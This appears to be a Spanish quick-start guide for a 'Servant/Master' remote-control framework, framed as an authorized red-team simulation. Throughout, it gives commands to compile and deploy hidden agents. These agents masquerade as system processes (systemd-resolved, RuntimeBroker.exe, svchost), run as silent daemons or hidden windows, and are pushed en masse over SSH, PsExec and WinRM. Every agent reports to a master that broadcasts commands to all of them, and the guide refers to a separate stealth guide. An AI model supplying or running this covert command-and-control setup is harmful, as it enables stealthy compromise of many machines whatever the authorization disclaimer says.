# 🚀 Guía de Uso Rápido - Servant/Master

## ⚡ Setup en 5 Minutos

### 1️⃣ Instalar dependencias
```bash
pip install -r requirements.txt
```

### 2️⃣ Compilar binarios

**Linux:**
```bash
./build.sh
```

**Windows:**
```cmd
build_windows.bat
```

### 3️⃣ Iniciar Master
```bash
python3 master.py serve --listen-host 0.0.0.0 --listen-port 65433
```

### 4️⃣ Desplegar Servant

**Linux (daemon oculto):**
```bash
./dist/systemd-resolved --daemon --silent --token SECRET --master-host MASTER_IP --master-port 65433
```

**Windows (ventana oculta):**
```cmd
RuntimeBroker.exe --hide-window --silent --token SECRET --master-host MASTER_IP --master-port 65433
```

### 5️⃣ Verificar y comandar
```bash
# Ver servants conectados
python3 master.py list

# Enviar a todos
python3 master.py send-all --token SECRET --action run --count 100
```

---

## 📁 Archivos del Proyecto

```
simulacion/
├── servant.py              # ⭐ Servidor principal (multiplataforma)
├── master.py               # 🎮 Cliente de control (CLI)
├── requirements.txt        # 📦 Dependencias Python
│
├── README.md              # 📖 Documentación principal
├── DEPLOYMENT.md          # 🚀 Guía completa de despliegue
├── STEALTH_GUIDE.md       # 🥷 Técnicas de ocultación
├── QUICK_START.md         # ⚡ Esta guía rápida
│
├── build.sh               # 🔨 Compilar binario Linux
├── build_windows.bat      # 🔨 Compilar binario Windows
│
├── deploy_windows.bat               # 📤 Deploy local Windows
├── deploy_windows_remote.py         # 📤 Deploy remoto Windows (WinRM)
├── deploy_multi.py                  # 📤 Deploy multiplataforma masivo
├── install_windows_service.py       # 🔧 Instalar como servicio Windows
│
└── hosts.json.example      # 📝 Ejemplo config para deploy masivo
```

---

## 🎯 Casos de Uso Comunes

### Caso 1: Ejecutar bodrio() en 1 host Linux
```bash
# Terminal 1: Master
python3 master.py serve

# Terminal 2: Servant (host remoto)
ssh user@host "python3 servant.py --token SECRET --master-host MASTER_IP --master-port 65433"

# Terminal 1: Enviar comando
python3 master.py send --ip host --token SECRET --action run --count 100
```

### Caso 2: Ejecutar bodrio() en 1 host Windows
```cmd
REM Terminal 1: Master
python master.py serve

REM Terminal 2: Servant (host remoto via RDP/PsExec)
RuntimeBroker.exe --hide-window --token SECRET --master-host MASTER_IP --master-port 65433

REM Terminal 1: Enviar comando
python master.py send --ip host --token SECRET --action run --count 100
```

### Caso 3: Despliegue masivo en múltiples hosts
```bash
# 1. Editar hosts.json con tus hosts
cp hosts.json.example hosts.json
nano hosts.json

# 2. Compilar binarios
./build.sh
./build_windows.bat  # Si tienes Wine o compilas en Windows

# 3. Iniciar master
python3 master.py serve &

# 4. Desplegar en todos
python3 deploy_multi.py --config hosts.json --token SECRET --master-ip MASTER_IP

# 5. Verificar
python3 master.py list

# 6. Ejecutar bodrio() en todos
python3 master.py send-all --token SECRET --action run --count 100
```

---

## 🔑 Opciones Importantes

### Servant (servidor)
| Opción | Descripción | Ejemplo |
|--------|-------------|---------|
| `--token` | Token de autenticación | `--token my-secret-123` |
| `--master-host` | IP del master | `--master-host 192.168.1.100` |
| `--master-port` | Puerto UDP master | `--master-port 65433` |
| `--daemon` | Modo daemon (Linux) | `--daemon` |
| `--hide-window` | Ocultar ventana (Windows) | `--hide-window` |
| `--silent` | Logging mínimo | `--silent` |
| `--process-name` | Nombre del proceso | `--process-name svchost` |
| `--port` | Puerto TCP servant | `--port 65432` |

### Master (cliente)
| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `serve` | Iniciar servidor registro | `master.py serve` |
| `list` | Listar servants | `master.py list` |
| `send` | Enviar a 1 servant | `master.py send --ip 192.168.1.50 --token SECRET` |
| `send-all` | Enviar a todos | `master.py send-all --token SECRET --count 100` |

---

## 🛠️ Implementar bodrio()

Edita `servant.py` línea ~33:

```python
def bodrio(index: int) -> None:
    """Tu lógica aquí."""
    import time
    import requests  # ejemplo
    
    # Ejemplo: escaneo de puerto
    target = f"192.168.1.{index}"
    try:
        response = requests.get(f"http://{target}", timeout=2)
        print(f"[{index}] {target} - UP")
    except:
        print(f"[{index}] {target} - DOWN")
    
    time.sleep(1)
```

**Recuerda:** Recompila después de modificar.

---

## 🧹 Limpieza

### Detener servants

**Linux:**
```bash
# Por PID
kill $(cat /var/tmp/.srv.pid)

# Por puerto
kill $(lsof -t -i:65432)
```

**Windows:**
```cmd
REM Por PID
for /f %i in (C:\Windows\Temp\.srv.pid) do taskkill /PID %i /F

REM Por nombre
taskkill /IM RuntimeBroker.exe /F
```

### Eliminar archivos

**Linux:**
```bash
rm -f /tmp/systemd-resolved /var/tmp/.srv.*
```

**Windows:**
```cmd
del /F /Q C:\Windows\Temp\RuntimeBroker.exe C:\Windows\Temp\.srv.*
```

---

## 🆘 Troubleshooting Rápido

| Problema | Solución |
|----------|----------|
| Servant no aparece en `list` | Verifica firewall UDP 65433 |
| No se conecta a servant | Verifica firewall TCP 65432 |
| Proceso visible | Compila con `--noconsole` (Windows) o usa `--daemon` (Linux) |
| Access denied | Ejecuta como admin/root |
| WinRM no funciona | `winrm quickconfig` en host remoto |

---

## 📚 Más Información

- **Despliegue completo:** Ver `DEPLOYMENT.md`
- **Técnicas de ocultación:** Ver `STEALTH_GUIDE.md`
- **Documentación general:** Ver `README.md`

---

## ⚠️ IMPORTANTE

✅ **USO AUTORIZADO ÚNICAMENTE**
- Obtén autorización por escrito
- Documenta todos los despliegues
- Limpia al terminar
- Respeta las políticas institucionales

---

## 🎓 Para la Institución

Este proyecto está diseñado para:
- ✅ Simulaciones de seguridad autorizadas
- ✅ Red-teaming institucional
- ✅ Administración remota legítima
- ✅ Pruebas de respuesta a incidentes
- ✅ Formación en ciberseguridad

**NO** para:
- ❌ Sistemas sin autorización
- ❌ Uso malicioso
- ❌ Violación de políticas
